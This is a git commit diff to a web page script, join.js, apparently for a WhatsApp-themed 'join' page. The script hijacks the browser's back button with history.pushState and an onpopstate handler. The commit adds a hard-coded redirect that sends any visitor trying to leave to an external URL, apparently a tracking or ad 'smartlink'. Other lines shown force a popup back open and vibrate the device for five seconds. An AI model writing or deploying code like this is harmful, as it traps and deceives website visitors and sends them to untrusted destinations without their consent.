1c55d3eb916d68119989492ac5fc8f5c0e91c10e
jandarahasia <85703474+jandarahasia@users.noreply.github.com>
2021-12-02 22:18:34 +0700

    Update join.js

--- script/join.js
+++ script/join.js
@@ -67,8 +67,8 @@ if (typeof history['pushState'] === 'function') {
             iy = 0;
             document['getElementById']('popup1')['style']['display'] = 'none';
             setTimeout(function() {
-                if (document['getElementById']('popup1')['style']['display'] == 'none') {
-                    document['getElementById']('popup1')['style']['display'] = 'block'
+                if (document['getElementById']('popup')['style']['display'] == 'none') {
+                    document['getElementById']('popup')['style']['display'] = 'block'
                 }
             }, 300);
             window['navigator']['vibrate'](5000)
@@ -94,6 +94,6 @@ function hidepop() {
         history.pushState("back", null, null);
         window.onpopstate = function() {
             history.pushState('back', null, null);
-            window.location.href = returnad;
+                location.href = 'https://cqwajn.com/gosl/InNpZCI6MTA3NDQ4Nywic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwMjg3Nzcs?si1=github&si2=whatsapp';
         };
     }
